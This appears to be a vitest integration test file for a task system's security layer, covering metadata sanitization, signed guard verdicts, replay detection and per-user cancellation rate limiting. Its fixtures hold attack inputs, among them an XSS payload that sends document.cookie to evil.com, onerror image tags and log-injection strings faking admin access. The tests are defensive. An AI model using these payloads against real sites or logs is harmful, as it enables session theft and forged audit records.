// Sprint 1 Day 10: Security Integration Tests
// Full security stack integration testing covering Threats T2, T4, T5
//
// Tests end-to-end scenarios combining:
// - GuardIsolation (Threat T2: Guard Bypass Exploitation)
// - MetadataValidator (Threat T4: Metadata Injection Attacks)
// - CancellationLimiter (Threat T5: Cancellation Abuse)

import { describe, expect, it, beforeEach } from 'vitest'
import * as GuardIsolation from '../../../packages/rescript-core/src/security/GuardIsolation.bs.js'
import * as MetadataValidator from '../../../packages/rescript-core/src/security/MetadataValidator.bs.js'
import * as CancellationLimiter from '../../../packages/rescript-core/src/security/CancellationLimiter.bs.js'

const mockSecretKey = 'integration-test-secret-key'

describe('Security Stack Integration - Threat T2 + T4 + T5', () => {
  it('enforces complete security pipeline for task lifecycle', () => {
    // Scenario: Task submission with metadata validation + guard isolation + cancellation protection
    const rawMetadata = {
      taskId: 'task-<script>alert(1)</script>', // XSS attempt (T4)
      manifestVersion: 'v1.0',
      attempt: 1,
      requestedBy: 'user@example.com',
      tags: ['<img src=x onerror=alert(1)>', 'production'], // XSS attempt (T4)
      priority: 'high',
      maliciousField: '<script>document.location="evil.com"</script>' // Unknown field + XSS (T4)
    }

    // Step 1: Validate and sanitize metadata (T4 mitigation)
    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      rawMetadata
    )

    expect(validationReport.valid).toBe(true)
    expect(validationReport.warnings.length).toBeGreaterThan(0) // Unknown fields removed

    // Verify XSS neutralized
    const sanitizedTaskId = JSON.stringify(validationReport.sanitized.taskId)
    expect(sanitizedTaskId).not.toContain('<script>')
    expect(sanitizedTaskId).toContain('&lt;')

    // Step 2: Execute guards with isolated context (T2 mitigation)
    const ctx = GuardIsolation.createContext('Preparing', 'DependenciesReady', validationReport.sanitized)

    const authGuard = (ctx: any) => 'Pass'
    const rateLimitGuard = (ctx: any) => 'Pass'

    const guards: Array<[(ctx: any) => any, string]> = [
      [authGuard, 'auth-guard'],
      [rateLimitGuard, 'rate-limit-guard']
    ]

    const guardResults = GuardIsolation.executeGuardsBatch(guards, ctx, mockSecretKey)

    expect(guardResults.length).toBe(2)
    expect(guardResults[0].isolated).toBe(true)
    expect(guardResults[1].isolated).toBe(true)

    // Verify signatures are valid
    const auditLog = guardResults.map(result => result.signedVerdict)
    const integrityValid = GuardIsolation.verifyAuditLogIntegrity(auditLog, ctx, mockSecretKey)
    expect(integrityValid).toBe(true)

    // Step 3: Rate limit cancellation attempts (T5 mitigation)
    const limiter = CancellationLimiter.createLimiter()
    const userId = 'user@example.com'

    const [newLimiter, cancellationResult] = CancellationLimiter.checkCancellation(
      limiter,
      'task-<script>alert(1)</script>', // Use sanitized taskId
      userId,
      'Preparing',
      'NotRequired'
    )

    expect(cancellationResult).toBe('Allowed')

    // Verify audit log for cancellation
    const cancellationAudit = CancellationLimiter.getAuditLog(newLimiter)
    expect(cancellationAudit.length).toBe(1)
    expect(cancellationAudit[0].allowed).toBe(true)
  })

  it('prevents multi-vector attack combining metadata injection + guard bypass + cancellation flood', () => {
    // Attacker scenario:
    // 1. Inject malicious metadata (XSS payload)
    // 2. Attempt to bypass guards by tampering context
    // 3. Flood cancellation requests to DoS

    // Attack Vector 1: Metadata Injection (T4)
    const attackMetadata = {
      taskId: 'task-123\\nINFO: ADMIN ACCESS GRANTED', // Log injection
      requestedBy: '\"><script>fetch("evil.com?cookie="+document.cookie)</script>',
      tags: Array(20).fill('<img src=x onerror=alert(1)>'), // Array limit exceeded + XSS
      unknownField1: 'should-be-removed',
      unknownField2: 'also-removed'
    }

    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      attackMetadata
    )

    // Should fail validation due to array limit
    expect(validationReport.valid).toBe(false)
    expect(validationReport.errors.some(err => err.includes('exceeds maximum items'))).toBe(true)

    // Use whitelisted + sanitized version
    const whitelisted = MetadataValidator.whitelistFields(
      MetadataValidator.taskMetadataSchema,
      attackMetadata
    )
    const sanitized = MetadataValidator.sanitizeMetadata(whitelisted)

    // Fix array to pass validation
    const fixedMetadata = {
      ...sanitized,
      tags: ['tag1', 'tag2'] // Reduce to valid size
    }

    // Attack Vector 2: Guard Bypass Attempt (T2)
    const ctx = GuardIsolation.createContext('Preparing', 'DependenciesReady', fixedMetadata)

    // Attacker attempts to create unfrozen context
    const tamperedCtx = {
      currentState: 'Executing', // Attempt to skip to EXECUTING
      event: 'DependenciesReady',
      metadata: fixedMetadata,
      frozen: false // Not frozen!
    }

    const guard = (ctx: any) => 'Pass'
    const result = GuardIsolation.executeGuardIsolated(guard, 'security-guard', tamperedCtx, mockSecretKey)

    // Should detect unfrozen context and fail
    expect(result.isolated).toBe(false)
    expect(result.signedVerdict.verdict.TAG).toBe('Fail')
    expect(result.signedVerdict.verdict._0).toContain('frozen')

    // Attack Vector 3: Cancellation Flooding (T5)
    const limiter = CancellationLimiter.createLimiter()
    const attackerId = 'attacker-123'

    let allowedCount = 0
    let deniedCount = 0

    // Simulate flooding with 30 rapid cancellation requests
    let currentLimiter = limiter
    for (let i = 0; i < 30; i++) {
      const [newLimiter, result] = CancellationLimiter.checkCancellation(
        currentLimiter,
        `task-${i}`,
        attackerId,
        'Idle',
        'NotRequired'
      )
      currentLimiter = newLimiter

      if (result === 'Allowed') {
        allowedCount++
      } else if (result.TAG === 'RateLimitExceeded') {
        deniedCount++
      }
    }

    // Only 10 should be allowed (rate limit), 20 should be denied
    expect(allowedCount).toBe(10)
    expect(deniedCount).toBe(20)

    // Verify audit log captured all attempts
    const auditLog = CancellationLimiter.getAuditLog(currentLimiter)
    expect(auditLog.length).toBe(30)
    expect(auditLog.filter(entry => !entry.allowed).length).toBe(20)
  })

  it('maintains security boundaries in concurrent task execution scenario', () => {
    // Scenario: Multiple users submitting tasks concurrently with different metadata and cancellation patterns

    const user1Metadata = {
      taskId: 'user1-task',
      requestedBy: 'user1@example.com',
      priority: 'high'
    }

    const user2Metadata = {
      taskId: 'user2-task',
      requestedBy: 'user2@example.com',
      tags: ['urgent', 'production'],
      priority: 'critical'
    }

    // Validate both users' metadata
    const validation1 = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, user1Metadata)
    const validation2 = MetadataValidator.validateMetadata(MetadataValidator.taskMetadataSchema, user2Metadata)

    expect(validation1.valid).toBe(true)
    expect(validation2.valid).toBe(true)

    // Create isolated contexts
    const ctx1 = GuardIsolation.createContext('Preparing', 'TaskSubmitted', validation1.sanitized)
    const ctx2 = GuardIsolation.createContext('Preparing', 'TaskSubmitted', validation2.sanitized)

    // Execute guards for both users
    const guard = (ctx: any) => 'Pass'
    const result1 = GuardIsolation.executeGuardIsolated(guard, 'auth-guard', ctx1, mockSecretKey)
    const result2 = GuardIsolation.executeGuardIsolated(guard, 'auth-guard', ctx2, mockSecretKey)

    // Verify isolation (different signatures due to different contexts)
    expect(result1.signedVerdict.signature).toBeTruthy()
    expect(result2.signedVerdict.signature).toBeTruthy()
    expect(result1.signedVerdict.signature).not.toBe(result2.signedVerdict.signature)

    // Verify signatures are valid for their respective contexts
    expect(GuardIsolation.verifySignature(result1.signedVerdict, ctx1, mockSecretKey)).toBe(true)
    expect(GuardIsolation.verifySignature(result2.signedVerdict, ctx2, mockSecretKey)).toBe(true)

    // Verify signature from one context fails verification with another context
    expect(GuardIsolation.verifySignature(result1.signedVerdict, ctx2, mockSecretKey)).toBe(false)

    // Per-user rate limiting isolation
    const limiter = CancellationLimiter.createLimiter()
    let limiterState = limiter

    // User 1 consumes all tokens
    for (let i = 0; i < 10; i++) {
      const [newLimiter, result] = CancellationLimiter.checkCancellation(
        limiterState,
        `user1-task-${i}`,
        'user1@example.com',
        'Idle',
        'NotRequired'
      )
      limiterState = newLimiter
    }

    // User 1's 11th cancellation should be rate limited
    const [limiter1, result1Cancel] = CancellationLimiter.checkCancellation(
      limiterState,
      'user1-task-11',
      'user1@example.com',
      'Idle',
      'NotRequired'
    )
    expect(result1Cancel.TAG).toBe('RateLimitExceeded')

    // User 2 should still have full token bucket (independent rate limit)
    const [limiter2, result2Cancel] = CancellationLimiter.checkCancellation(
      limiter1,
      'user2-task-1',
      'user2@example.com',
      'Idle',
      'NotRequired'
    )
    expect(result2Cancel).toBe('Allowed')

    // Verify per-user statistics
    const [user1Tokens, user1Count] = CancellationLimiter.getUserStats(limiter2, 'user1@example.com')
    const [user2Tokens, user2Count] = CancellationLimiter.getUserStats(limiter2, 'user2@example.com')

    expect(user1Tokens).toBeLessThan(1.0) // User 1 exhausted tokens
    expect(user1Count).toBe(10) // User 1 had 10 successful cancellations
    expect(user2Tokens).toBeLessThan(10.0) // User 2 consumed 1 token
    expect(user2Count).toBe(1) // User 2 had 1 successful cancellation
  })

  it('enforces dual confirmation with metadata validation for EXECUTING state', () => {
    // Scenario: User attempts to cancel EXECUTING task - requires confirmation + metadata validation

    const metadata = {
      taskId: 'executing-task-123',
      requestedBy: 'user@example.com',
      tags: ['critical', 'production'],
      priority: 'critical'
    }

    // Validate metadata
    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      metadata
    )
    expect(validationReport.valid).toBe(true)

    // Create context in EXECUTING state
    const ctx = GuardIsolation.createContext('Executing', 'CancelRequest', validationReport.sanitized)

    // Execute cancellation guard (should pass)
    const cancelGuard = (ctx: any) => {
      // Check if state is EXECUTING
      if (ctx.currentState === 'Executing') {
        return 'Pass'
      }
      return { TAG: 'Fail', _0: 'Invalid state for cancellation' }
    }

    const guardResult = GuardIsolation.executeGuardIsolated(cancelGuard, 'cancel-guard', ctx, mockSecretKey)
    expect(guardResult.signedVerdict.verdict).toBe('Pass')

    // Create cancellation limiter
    const limiter = CancellationLimiter.createLimiter()
    const userId = 'user@example.com'

    // Attempt 1: No confirmation (should require confirmation)
    const confirmation1 = CancellationLimiter.createConfirmationRequirement('Executing')
    expect(confirmation1.TAG).toBe('Required')

    const [limiter1, result1] = CancellationLimiter.checkCancellation(
      limiter,
      'executing-task-123',
      userId,
      'Executing',
      confirmation1
    )

    expect(result1.TAG).toBe('ConfirmationRequired')
    expect(result1.status.TAG).toBe('Required')

    // Attempt 2: With confirmation (should succeed)
    const confirmation2 = CancellationLimiter.confirmCancellation(confirmation1)
    expect(CancellationLimiter.isConfirmationComplete(confirmation2)).toBe(true)

    const [limiter2, result2] = CancellationLimiter.checkCancellation(
      limiter1,
      'executing-task-123',
      userId,
      'Executing',
      confirmation2
    )

    expect(result2).toBe('Allowed')

    // Verify audit log shows confirmation flow
    const auditLog = CancellationLimiter.getAuditLog(limiter2)
    expect(auditLog.length).toBe(2)

    // First attempt: confirmation required but not provided
    expect(auditLog[0].confirmationRequired).toBe(true)
    expect(auditLog[0].confirmationProvided).toBe(false)
    expect(auditLog[0].allowed).toBe(false)

    // Second attempt: confirmation provided
    expect(auditLog[1].confirmationRequired).toBe(true)
    expect(auditLog[1].confirmationProvided).toBe(true)
    expect(auditLog[1].allowed).toBe(true)
  })

  it('provides complete audit trail across all security layers', () => {
    // Scenario: Full task lifecycle with complete audit logging

    const metadata = {
      taskId: 'audit-test-task',
      manifestVersion: 'v1.0',
      attempt: 1,
      requestedBy: 'auditor@example.com',
      tags: ['audit', 'test'],
      priority: 'high'
    }

    // Step 1: Metadata validation (audit point 1)
    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      metadata
    )
    expect(validationReport.valid).toBe(true)

    // Step 2: Guard execution (audit point 2)
    const ctx = GuardIsolation.createContext('Preparing', 'DependenciesReady', validationReport.sanitized)

    const guards: Array<[(ctx: any) => any, string]> = [
      [(ctx: any) => 'Pass', 'auth-guard'],
      [(ctx: any) => 'Pass', 'rate-limit-guard'],
      [(ctx: any) => ({ TAG: 'Defer', _0: 'Async check pending' }), 'dependency-guard']
    ]

    const guardResults = GuardIsolation.executeGuardsBatch(guards, ctx, mockSecretKey)

    // Verify guard audit log
    let guardAuditLog = GuardIsolation.createAuditLog()
    guardResults.forEach(result => {
      guardAuditLog = GuardIsolation.appendToAuditLog(guardAuditLog, result)
    })

    expect(guardAuditLog.length).toBe(3)
    expect(guardAuditLog[0].guardName).toBe('auth-guard')
    expect(guardAuditLog[1].guardName).toBe('rate-limit-guard')
    expect(guardAuditLog[2].guardName).toBe('dependency-guard')

    // Verify all signatures are valid
    const guardIntegrityValid = GuardIsolation.verifyAuditLogIntegrity(guardAuditLog, ctx, mockSecretKey)
    expect(guardIntegrityValid).toBe(true)

    // Step 3: Cancellation attempts (audit point 3)
    const limiter = CancellationLimiter.createLimiter()
    const userId = 'auditor@example.com'

    // Make several cancellation attempts
    let currentLimiter = limiter
    for (let i = 0; i < 5; i++) {
      const [newLimiter, result] = CancellationLimiter.checkCancellation(
        currentLimiter,
        `audit-test-task-${i}`,
        userId,
        'Idle',
        'NotRequired'
      )
      currentLimiter = newLimiter
    }

    // Verify cancellation audit log
    const cancellationAuditLog = CancellationLimiter.getAuditLog(currentLimiter)
    expect(cancellationAuditLog.length).toBe(5)

    // All entries should have complete metadata
    cancellationAuditLog.forEach(entry => {
      expect(entry.taskId).toBeTruthy()
      expect(entry.userId).toBe(userId)
      expect(entry.timestamp).toBeGreaterThan(0)
      expect(typeof entry.rateLimitPassed).toBe('boolean')
      expect(typeof entry.allowed).toBe('boolean')
      expect(entry.allowed).toBe(true) // All within rate limit
    })

    // Complete audit trail available:
    // - Metadata validation report
    // - Guard execution audit log (3 entries with signatures)
    // - Cancellation audit log (5 entries)
    expect(validationReport).toBeTruthy()
    expect(guardAuditLog.length).toBe(3)
    expect(cancellationAuditLog.length).toBe(5)
  })

  it('detects and prevents signature replay attacks', () => {
    // Scenario: Attacker captures valid signed verdict and attempts to replay it

    const metadata = { taskId: 'task-123', priority: 'high' }
    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      metadata
    )

    // Step 1: Legitimate guard execution
    const ctx1 = GuardIsolation.createContext('Preparing', 'DependenciesReady', validationReport.sanitized)
    const guard = (ctx: any) => 'Pass'
    const result1 = GuardIsolation.executeGuardIsolated(guard, 'auth-guard', ctx1, mockSecretKey)

    expect(result1.signedVerdict.verdict).toBe('Pass')
    expect(GuardIsolation.verifySignature(result1.signedVerdict, ctx1, mockSecretKey)).toBe(true)

    // Step 2: Attacker captures signed verdict and attempts replay with different context
    const ctx2 = GuardIsolation.createContext('Executing', 'TaskStarted', validationReport.sanitized)

    // Replay attack: Use signature from ctx1 with ctx2
    const replayValid = GuardIsolation.verifySignature(result1.signedVerdict, ctx2, mockSecretKey)
    expect(replayValid).toBe(false) // Signature should fail - different context

    // Step 3: Attacker attempts to modify verdict while keeping signature
    const tamperedVerdict = {
      ...result1.signedVerdict,
      verdict: { TAG: 'Fail', _0: 'Tampered' }
    }

    const tamperedValid = GuardIsolation.verifySignature(tamperedVerdict, ctx1, mockSecretKey)
    expect(tamperedValid).toBe(false) // Signature should fail - verdict modified
  })

  it('enforces size limits to prevent resource exhaustion attacks', () => {
    // Scenario: Attacker attempts resource exhaustion via oversized metadata

    const oversizedMetadata = {
      taskId: 'task-123',
      requestedBy: 'x'.repeat(15000), // 15KB - exceeds 10KB limit
      tags: ['tag1', 'tag2']
    }

    const size = MetadataValidator.calculateMetadataSize(oversizedMetadata)
    expect(size).toBeGreaterThan(MetadataValidator.maxMetadataSizeBytes)

    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      oversizedMetadata
    )

    // Should fail validation due to size
    expect(validationReport.valid).toBe(false)
    expect(validationReport.errors.some(err => err.includes('exceeds maximum allowed'))).toBe(true)

    // Even if size passes, field length limit should catch it
    const longFieldMetadata = {
      taskId: 'task-123',
      requestedBy: 'x'.repeat(200) // Exceeds 128 char limit
    }

    const fieldValidationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      longFieldMetadata
    )

    expect(fieldValidationReport.valid).toBe(false)
    expect(fieldValidationReport.errors.some(err => err.includes('exceeds maximum length'))).toBe(true)
  })

  it('prevents log injection through metadata sanitization', () => {
    // Scenario: Attacker attempts log injection via newline smuggling

    const logInjectionMetadata = {
      taskId: 'task-123\\nINFO: ADMIN ACCESS GRANTED\\nINFO: Password reset for admin@example.com',
      requestedBy: 'attacker@example.com',
      priority: 'high'
    }

    const sanitized = MetadataValidator.sanitizeMetadata(logInjectionMetadata)

    // Sanitized string should have newlines removed
    const sanitizedTaskId = MetadataValidator.sanitizeString(logInjectionMetadata.taskId)
    expect(sanitizedTaskId).not.toContain('\\n')
    expect(sanitizedTaskId).not.toContain('ADMIN ACCESS GRANTED')
  })

  it('maintains performance under high load while enforcing security', () => {
    // Scenario: 100 concurrent tasks with full security validation

    const results = []
    const limiter = CancellationLimiter.createLimiter()
    let currentLimiter = limiter

    for (let i = 0; i < 100; i++) {
      const metadata = {
        taskId: `task-${i}`,
        requestedBy: `user${i % 10}@example.com`, // 10 different users
        priority: 'high'
      }

      // Metadata validation
      const validationReport = MetadataValidator.validateMetadata(
        MetadataValidator.taskMetadataSchema,
        metadata
      )

      // Guard execution
      const ctx = GuardIsolation.createContext('Preparing', 'TaskSubmitted', validationReport.sanitized)
      const guard = (ctx: any) => 'Pass'
      const guardResult = GuardIsolation.executeGuardIsolated(guard, `guard-${i}`, ctx, mockSecretKey)

      // Cancellation check
      const [newLimiter, cancellationResult] = CancellationLimiter.checkCancellation(
        currentLimiter,
        `task-${i}`,
        `user${i % 10}@example.com`,
        'Preparing',
        'NotRequired'
      )
      currentLimiter = newLimiter

      results.push({
        validationValid: validationReport.valid,
        guardIsolated: guardResult.isolated,
        guardVerdict: guardResult.signedVerdict.verdict,
        cancellationAllowed: cancellationResult === 'Allowed' || cancellationResult.TAG === 'RateLimitExceeded'
      })
    }

    // All validations should pass
    expect(results.every(r => r.validationValid)).toBe(true)

    // All guards should be isolated
    expect(results.every(r => r.guardIsolated)).toBe(true)

    // All guards should pass
    expect(results.every(r => r.guardVerdict === 'Pass')).toBe(true)

    // Rate limiting should kick in for users (10 users, each can do 10 cancellations)
    // So at most 100 should be allowed, but some users will hit rate limit
    const auditLog = CancellationLimiter.getAuditLog(currentLimiter)
    expect(auditLog.length).toBe(100)

    // Each user should have exactly 10 cancellations attempted
    for (let userId = 0; userId < 10; userId++) {
      const userEntries = auditLog.filter(entry => entry.userId === `user${userId}@example.com`)
      expect(userEntries.length).toBe(10)

      // All 10 should be allowed (within rate limit)
      const allowedCount = userEntries.filter(entry => entry.allowed).length
      expect(allowedCount).toBe(10)
    }
  })
})

describe('Edge Cases and Error Handling', () => {
  it('handles null and undefined metadata gracefully', () => {
    const nullMetadata = {
      taskId: 'task-123',
      requestedBy: null as any
    }

    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      nullMetadata
    )

    // Should handle null values
    expect(validationReport).toBeTruthy()
  })

  it('handles empty metadata object', () => {
    const emptyMetadata = {}

    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      emptyMetadata
    )

    // Should fail due to missing required 'taskId'
    expect(validationReport.valid).toBe(false)
    expect(validationReport.errors.some(err => err.includes('taskId'))).toBe(true)
  })

  it('handles signature expiration detection', () => {
    const ctx = GuardIsolation.createContext('Idle', 'DependenciesReady', undefined)
    const guard = (ctx: any) => 'Pass'
    const result = GuardIsolation.executeGuardIsolated(guard, 'test-guard', ctx, mockSecretKey)

    // Check if not expired within 1 hour
    const notExpired = GuardIsolation.isSignatureExpired(result.signedVerdict, 3600000)
    expect(notExpired).toBe(false)

    // Check if expired with negative max age (signature created in past)
    const expired = GuardIsolation.isSignatureExpired(result.signedVerdict, -1)
    expect(expired).toBe(true)
  })

  it('handles confirmation timeout expiration', () => {
    const confirmationStatus = CancellationLimiter.createConfirmationRequirement('Executing')
    expect(confirmationStatus.TAG).toBe('Required')

    const now = Date.now()

    // Not expired immediately
    const notExpired = CancellationLimiter.isConfirmationExpired(confirmationStatus, now + 1000)
    expect(notExpired).toBe(false)

    // Expired after 31 seconds
    const expired = CancellationLimiter.isConfirmationExpired(confirmationStatus, now + 31000)
    expect(expired).toBe(true)
  })

  it('handles concurrent guard execution with shared context', () => {
    const metadata = { taskId: 'task-123', priority: 'high' }
    const validationReport = MetadataValidator.validateMetadata(
      MetadataValidator.taskMetadataSchema,
      metadata
    )

    const ctx = GuardIsolation.createContext('Preparing', 'DependenciesReady', validationReport.sanitized)

    // Execute same guard multiple times concurrently (simulated)
    const guard = (ctx: any) => 'Pass'
    const results = Array.from({ length: 5 }, (_, i) =>
      GuardIsolation.executeGuardIsolated(guard, `guard-${i}`, ctx, mockSecretKey)
    )

    // All should be isolated
    expect(results.every(r => r.isolated)).toBe(true)

    // All should have valid signatures
    results.forEach(result => {
      expect(GuardIsolation.verifySignature(result.signedVerdict, ctx, mockSecretKey)).toBe(true)
    })
  })
})
